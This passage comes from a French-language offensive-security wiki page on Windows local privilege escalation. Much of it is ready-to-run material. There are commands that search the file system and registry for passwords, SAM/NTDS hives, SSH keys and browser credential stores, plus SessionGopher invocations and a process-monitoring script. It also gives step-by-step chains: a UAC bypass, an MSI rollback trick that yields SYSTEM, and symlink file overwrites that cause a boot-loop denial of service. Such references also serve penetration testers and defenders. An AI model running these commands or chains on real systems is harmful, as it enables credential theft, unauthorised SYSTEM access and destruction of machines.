cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Veuillez rechercher tous les fichiers proposés :
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Identifiants dans la RecycleBin

Vous devriez aussi vérifier la Bin pour y chercher des identifiants

Pour **récupérer des mots de passe** enregistrés par plusieurs programmes, vous pouvez utiliser : [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dans le registry

**Autres clés de registry possibles avec des identifiants**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extraire les clés openssh depuis le registre.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historique des navigateurs

Vous devriez vérifier les dbs où les mots de passe de **Chrome ou Firefox** sont stockés.\
Vérifiez aussi l’historique, les bookmarks et les favourites des navigateurs, au cas où certains **passwords are** y seraient stockés.

Outils pour extraire les mots de passe des navigateurs :

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** est une technologie intégrée au système d’exploitation Windows qui permet l’**intercommunication** entre des composants logiciels de différents langages. Chaque composant COM est **identifié via un class ID (CLSID)** et chaque composant expose des fonctionnalités via une ou plusieurs interfaces, identifiées par des interface IDs (IIDs).

Les classes et interfaces COM sont définies dans le registre sous **HKEY\CLASSES\ROOT\CLSID** et **HKEY\CLASSES\ROOT\Interface** respectivement. Ce registre est créé en fusionnant **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

À l’intérieur des CLSIDs de ce registre, vous pouvez trouver la sous-clé de registre **InProcServer32** qui contient une **default value** pointant vers une **DLL** et une valeur appelée **ThreadingModel** qui peut être **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ou **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

En gros, si vous pouvez **overwrite any of the DLLs** qui vont être exécutées, vous pourriez **escalate privileges** si cette DLL doit être exécutée par un autre utilisateur.

Pour apprendre comment les attaquants utilisent COM Hijacking comme mécanisme de persistence, consultez :


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Rechercher le contenu des fichiers**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Rechercher un fichier avec un nom de fichier précis**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Rechercher dans le registre les noms de clés et les mots de passe**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools qui recherchent des passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) search automatiquement tous les fichiers contenant des passwords mentionnés sur cette page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imaginez qu'**un processus exécuté en tant que SYSTEM ouvre un nouveau processus** (`OpenProcess()`) **avec un accès complet**. Le même processus **crée aussi un nouveau processus** (`CreateProcess()`) **avec des privilèges faibles mais en héritant de tous les open handles du processus principal**.\
Ensuite, si vous avez **un accès complet au processus à faible privilège**, vous pouvez récupérer **l'open handle vers le processus privilégié créé** avec `OpenProcess()` et **injecter un shellcode**.\
[Lisez cet exemple pour plus d'informations sur **la façon de détecter et d'exploiter cette vulnérabilité**.](leaked-handle-exploitation.md)\
[Lisez cet **autre post pour une explication plus complète sur la façon de tester et d'abuser de davantage de open handlers de processus et de threads hérités avec différents niveaux de permissions (pas seulement full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Les segments de mémoire partagée, appelés **pipes**, permettent la communication entre processus et le transfert de données.

Windows fournit une fonctionnalité appelée **Named Pipes**, permettant à des processus sans lien direct de partager des données, même sur des réseaux différents. Cela ressemble à une architecture client/serveur, avec des rôles définis comme **named pipe server** et **named pipe client**.

Lorsque des données sont envoyées via un pipe par un **client**, le **server** qui a configuré le pipe a la capacité de **prendre l'identité** du **client**, à condition de disposer des droits **SeImpersonate** nécessaires. Identifier un **processus privilégié** qui communique via un pipe que vous pouvez imiter offre une opportunité d'**obtenir des privilèges plus élevés** en adoptant l'identité de ce processus lorsqu'il interagit avec le pipe que vous avez établi. Pour des instructions sur l'exécution d'une telle attaque, des guides utiles peuvent être trouvés [**ici**](named-pipe-client-impersonation.md) et [**ici**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Le service Telephony (TapiSrv) en mode serveur expose `\\pipe\\tapsrv` (MS-TRP). Un client distant authentifié peut abuser du chemin d'événements async basé sur mailslot pour transformer `ClientAttach` en un **écriture arbitraire de 4 octets** dans n'importe quel fichier existant inscriptible par `NETWORK SERVICE`, puis obtenir les droits d'administration Telephony et charger une DLL arbitraire en tant que service. Flux complet :

- `ClientAttach` avec `pszDomainUser` défini sur un chemin existant inscriptible → le service l'ouvre via `CreateFileW(..., OPEN_EXISTING)` et l'utilise pour les écritures d'événements async.
- Chaque événement écrit le `InitContext` contrôlé par l'attaquant depuis `Initialize` vers ce handle. Enregistrez une app de ligne avec `LRegisterRequestRecipient` (`Req_Func 61`), déclenchez `TRequestMakeCall` (`Req_Func 121`), récupérez via `GetAsyncEvents` (`Req_Func 0`), puis désenregistrez/arrêtez pour répéter des écritures déterministes.
- Ajoutez-vous à `[TapiAdministrators]` dans `C:\Windows\TAPI\tsec.ini`, reconnectez-vous, puis appelez `GetUIDllName` avec un chemin de DLL arbitraire pour exécuter `TSPI_providerUIIdentify` en tant que `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Vol des mots de passe depuis des processus

## De Low Priv User à NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si vous avez accès à l'interface graphique (via la console ou RDP) et que UAC est activé, dans certaines versions de Microsoft Windows il est possible d'exécuter un terminal ou tout autre processus tel que "NT\AUTHORITY SYSTEM" depuis un utilisateur non privilégié.

Cela permet d'escalader les privilèges et de contourner UAC en même temps avec la même vulnérabilité. De plus, il n'est pas nécessaire d'installer quoi que ce soit et le binaire utilisé pendant le processus est signé et émis par Microsoft.

Voici quelques-uns des systèmes affectés :
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Pour exploiter cette vulnérabilité, il est nécessaire d'effectuer les étapes suivantes :
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## De Administrator Medium to High Integrity Level / UAC Bypass

Lisez ceci pour **apprendre les Integrity Levels** :


{{#ref}}
integrity-levels.md
{{#endref}}

Puis **lisez ceci pour apprendre UAC et les UAC bypasses :**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

La technique décrite [**dans ce billet de blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) avec un code d'exploit [**disponible ici**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

L'attaque consiste essentiellement à abuser de la fonctionnalité de rollback de Windows Installer pour remplacer des fichiers légitimes par des fichiers malveillants pendant le processus de désinstallation. Pour cela, l'attaquant doit créer un **MSI installer malveillant** qui sera utilisé pour détourner le dossier `C:\Config.Msi`, lequel sera ensuite utilisé par Windows Installer pour stocker les fichiers de rollback lors de la désinstallation d'autres packages MSI, où les fichiers de rollback auront été modifiés pour contenir le payload malveillant.

La technique résumée est la suivante :

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Créez un `.msi` qui installe un fichier inoffensif (par ex. `dummy.txt`) dans un dossier inscriptible (`TARGETDIR`).
- Marquez l'installer comme **"UAC Compliant"**, afin qu'un **non-admin user** puisse l'exécuter.
- Gardez un **handle** ouvert sur le fichier après l'installation.

- Step 2: Begin Uninstall
- Désinstallez le même `.msi`.
- Le processus de désinstallation commence à déplacer les fichiers vers `C:\Config.Msi` et à les renommer en fichiers `.rbf` (rollback backups).
- **Poll the open file handle** avec `GetFinalPathNameByHandle` pour détecter quand le fichier devient `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- Le `.msi` inclut une **custom uninstall action (`SyncOnRbfWritten`)** qui :
- Signale quand `.rbf` a été écrit.
- Puis **waits** sur un autre event avant de continuer la désinstallation.

- Step 4: Block Deletion of `.rbf`
- Lorsqu'il est signalé, **open the `.rbf` file** sans `FILE_SHARE_DELETE` — cela **empêche sa suppression**.
- Puis **signaler en retour** pour que la désinstallation puisse se terminer.
- Windows Installer échoue à supprimer le `.rbf`, et comme il ne peut pas supprimer tout le contenu, **`C:\Config.Msi` n'est pas removed**.

- Step 5: Manually Delete `.rbf`
- Vous (attacker) supprimez manuellement le fichier `.rbf`.
- Maintenant **`C:\Config.Msi` est empty**, prêt à être hijacked.

> À ce stade, **déclenchez la vulnérabilité SYSTEM-level arbitrary folder delete** pour supprimer `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recréez vous-même le dossier `C:\Config.Msi`.
- Définissez des **weak DACLs** (par ex. Everyone:F), et **gardez un handle ouvert** avec `WRITE_DAC`.

- Step 7: Run Another Install
- Installez à nouveau le `.msi`, avec :
- `TARGETDIR` : emplacement inscriptible.
- `ERROROUT` : une variable qui déclenche un échec forcé.
- Cette installation sera utilisée pour déclencher à nouveau **rollback**, qui lit `.rbs` et `.rbf`.

- Step 8: Monitor for `.rbs`
- Utilisez `ReadDirectoryChangesW` pour surveiller `C:\Config.Msi` jusqu'à ce qu'un nouveau `.rbs` apparaisse.
- Capturez son nom de fichier.

- Step 9: Sync Before Rollback
- Le `.msi` contient une **custom install action (`SyncBeforeRollback`)** qui :
- Signale un event lorsque le `.rbs` est créé.
- Puis **waits** avant de continuer.

- Step 10: Reapply Weak ACL
- Après réception de l'event `rbs created` :
- Windows Installer **reapplies strong ACLs** à `C:\Config.Msi`.
- Mais comme vous avez toujours un handle avec `WRITE_DAC`, vous pouvez **réappliquer weak ACLs** à nouveau.

> Les ACLs sont **only enforced on handle open**, donc vous pouvez toujours écrire dans le dossier.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Écrasez le fichier `.rbs` avec un **fake rollback script** qui indique à Windows de :
- Restaurer votre fichier `.rbf` (DLL malveillante) dans un **privileged location** (par ex. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Déposez votre faux `.rbf` contenant un **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signalez l'event de sync afin que l'installer reprenne.
- Une **type 19 custom action (`ErrorOut`)** est configurée pour **intentional fail** l'installation à un point connu.
- Cela provoque le **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer :
- Lit votre `.rbs` malveillant.
- Copie votre DLL `.rbf` dans l'emplacement cible.
- Vous avez maintenant votre **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Exécutez un binaire **auto-elevated** de confiance (par ex. `osk.exe`) qui charge la DLL que vous avez hijacked.
- **Boom** : votre code est exécuté **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

La principale technique de rollback MSI (la précédente) suppose que vous pouvez supprimer un **dossier entier** (par ex. `C:\Config.Msi`). Mais que se passe-t-il si votre vulnérabilité permet seulement la **suppression arbitraire de fichiers** ?

Vous pourriez exploiter les **NTFS internals** : chaque dossier a un alternate data stream caché appelé :
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ce stream stocke les **métadonnées d’index** du dossier.

Ainsi, si vous **supprimez le stream `::$INDEX_ALLOCATION`** d’un dossier, NTFS **supprime l’intégralité du dossier** du système de fichiers.

Vous pouvez faire cela en utilisant des API standards de suppression de fichiers comme :
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Même si vous appelez une API de suppression de *fichier*, elle **supprime le dossier lui-même**.

### De la suppression du contenu d'un dossier à SYSTEM EoP
Et si votre primitive ne vous permet pas de supprimer des fichiers/dossiers arbitraires, mais qu'elle **permet la suppression du contenu d'un dossier contrôlé par l'attaquant** ?

1. Étape 1 : Configurer un dossier et un fichier leurres
- Créer : `C:\temp\folder1`
- À l'intérieur : `C:\temp\folder1\file1.txt`

2. Étape 2 : Placer un **oplock** sur `file1.txt`
- L'oplock **met en pause l'exécution** lorsqu'un processus privilégié tente de supprimer `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Étape 3 : Déclencher un processus SYSTEM (par ex. `SilentCleanup`)
- Ce processus parcourt des dossiers (par ex. `%TEMP%`) et tente d’en supprimer le contenu.
- Lorsqu’il atteint `file1.txt`, l’**oplock se déclenche** et transfère le contrôle à votre callback.

4. Étape 4 : Dans le callback de l’oplock – rediriger la suppression

- Option A : Déplacer `file1.txt` ailleurs
- Cela vide `folder1` sans casser l’oplock.
- Ne supprimez pas `file1.txt` directement — cela libérerait l’oplock trop tôt.

- Option B : Convertir `folder1` en **junction** :
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C : Créer un **symlink** dans `\RPC Control` :
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Cela cible le flux interne NTFS qui stocke les métadonnées du dossier — le supprimer supprime le dossier.

5. Step 5: Release the oplock
- Le processus SYSTEM continue et essaie de supprimer `file1.txt`.
- Mais maintenant, à cause du junction + symlink, il supprime en réalité :
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Résultat** : `C:\Config.Msi` est supprimé par SYSTEM.

### De la création de dossier arbitraire à un DoS permanent

Exploitez une primitive qui vous permet de **créer un dossier arbitraire en tant que SYSTEM/admin** — même si **vous ne pouvez pas écrire de fichiers** ou **définir des permissions faibles**.

Créez un **dossier** (pas un fichier) avec le nom d’un **pilote Windows critique**, par exemple :
```
C:\Windows\System32\cng.sys
```
- Ce chemin correspond normalement au pilote en mode noyau `cng.sys`.
- Si vous le **pré-créez comme dossier**, Windows échoue à charger le vrai pilote au démarrage.
- Ensuite, Windows essaie de charger `cng.sys` pendant le boot.
- Il voit le dossier, **ne parvient pas à résoudre le vrai pilote**, et **crashe ou bloque le démarrage**.
- Il n’y a **pas de solution de repli**, et **pas de récupération** sans intervention externe (par ex. réparation du boot ou accès au disque).

### Des chemins de log/backup privilégiés + des symlinks OM vers un écrasement arbitraire de fichier / DoS du boot

Quand un **service privilégié** écrit des logs/exports vers un chemin lu depuis une **config inscriptible**, redirigez ce chemin avec des **Object Manager symlinks + NTFS mount points** pour transformer l’écriture privilégiée en écrasement arbitraire (même **sans** SeCreateSymbolicLinkPrivilege).

**Exigences**
- La config qui stocke le chemin cible est inscriptible par l’attaquant (par ex. `%ProgramData%\...\.ini`).
- Possibilité de créer un mount point vers `\RPC Control` et un OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Une opération privilégiée qui écrit vers ce chemin (log, export, report).

**Chaîne d’exemple**
1. Lisez la config pour récupérer la destination du log privilégié, par ex. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` dans `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirigez le chemin sans admin :
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Attendre que le composant privilégié écrive le log (par ex., l’admin déclenche "send test SMS"). L’écriture arrive maintenant dans `C:\Windows\System32\cng.sys`.
4. Inspecter la cible écrasée (hex/PE parser) pour confirmer la corruption ; le redémarrage force Windows à charger le chemin du driver altéré → **boot loop DoS**. Cela se généralise aussi à tout fichier protégé qu’un service privilégié ouvrira en écriture.

> `cng.sys` est normalement chargé depuis `C:\Windows\System32\drivers\cng.sys`, mais si une copie existe dans `C:\Windows\System32\cng.sys`, elle peut être tentée en premier, ce qui en fait une cible DoS fiable pour des données corrompues.



## **From High Integrity to System**

### **New service**

Si vous exécutez déjà un processus à High Integrity, le **chemin vers SYSTEM** peut être facile en **créant et exécutant un nouveau service** :
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Lors de la création d'un binaire de service, assurez-vous que c'est un service valide ou que le binaire effectue les actions nécessaires rapidement, sinon il sera tué en 20s s'il ne s'agit pas d'un service valide.

### AlwaysInstallElevated

Depuis un processus High Integrity, vous pouvez essayer d'**activer les entrées de registre AlwaysInstallElevated** et **installer** un reverse shell à l'aide d'un wrapper _**.msi**_.\
[Plus d'informations sur les clés de registre concernées et sur la façon d'installer un package _.msi_ ici.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Vous pouvez** [**trouver le code ici**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Si vous avez ces token privileges (probablement vous les trouverez dans un processus déjà High Integrity), vous pourrez **ouvrir presque n'importe quel processus** (non protégé) avec le privilège SeDebug, **copier le token** du processus, et créer un **processus arbitraire avec ce token**.\
En utilisant cette technique, on **sélectionne généralement tout processus s'exécutant en tant que SYSTEM avec tous les token privileges** (_oui, vous pouvez trouver des processus SYSTEM sans tous les token privileges_).\
**Vous pouvez trouver un** [**exemple de code exécutant la technique proposée ici**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Cette technique est utilisée par meterpreter pour escalader dans `getsystem`. La technique consiste à **créer un pipe puis à créer/abuser d'un service pour écrire dans ce pipe**. Ensuite, le **server** qui a créé le pipe en utilisant le privilège **`SeImpersonate`** pourra **impersonate le token** du client du pipe (le service) en obtenant les privilèges SYSTEM.\
Si vous voulez [**en savoir plus sur les name pipes, vous devriez lire ceci**](#named-pipe-client-impersonation).\
Si vous voulez lire un exemple de [**comment passer de high integrity à System en utilisant les name pipes, vous devriez lire ceci**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si vous parvenez à **hijack un dll** chargé par un **processus** s'exécutant en tant que **SYSTEM**, vous pourrez exécuter du code arbitraire avec ces permissions. Par conséquent, Dll Hijacking est aussi utile pour ce type d'escalade de privilèges, et, en plus, c'est beaucoup **plus facile à réaliser depuis un processus High Integrity** car il disposera de **permissions d'écriture** sur les dossiers utilisés pour charger les dlls.\
**Vous pouvez** [**en savoir plus sur Dll hijacking ici**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lire:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Vérifie les mauvaises configurations et les fichiers sensibles (**[**voir ici**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Détecté.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Vérifie certaines mauvaises configurations possibles et collecte des informations (**[**voir ici**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Vérifie les mauvaises configurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Il extrait les informations de session enregistrées de PuTTY, WinSCP, SuperPuTTY, FileZilla et RDP. Utilisez -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrait les identifiants du Credential Manager. Détecté.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray les mots de passe collectés sur le domaine**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh est un outil PowerShell ADIDNS/LLMNR/mDNS spoofer et man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Énumération Windows de base pour privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Recherche les vulnérabilités privesc connues (DÉCONSEILLÉ au profit de Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Vérifications locales **(besoin des droits Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Recherche les vulnérabilités privesc connues (doit être compilé avec VisualStudio) ([**précompilé**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Énumère l'hôte à la recherche de mauvaises configurations (plutôt un outil de collecte d'informations qu'un outil de privesc) (doit être compilé) **(**[**précompilé**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrait des identifiants depuis de nombreux logiciels (exe précompilé sur github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portage de PowerUp en C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Vérifie les mauvaises configurations (exécutable précompilé sur github). Déconseillé. Fonctionne mal sous Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Vérifie les mauvaises configurations possibles (exe issu de python). Déconseillé. Fonctionne mal sous Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Outil créé à partir de cet article (il n'a pas besoin d'accesschk pour fonctionner correctement mais peut l'utiliser).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Vous devez compiler le projet en utilisant la bonne version de .NET ([voir ceci](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Pour voir la version installée de .NET sur l'hôte victime, vous pouvez faire :
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Références

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
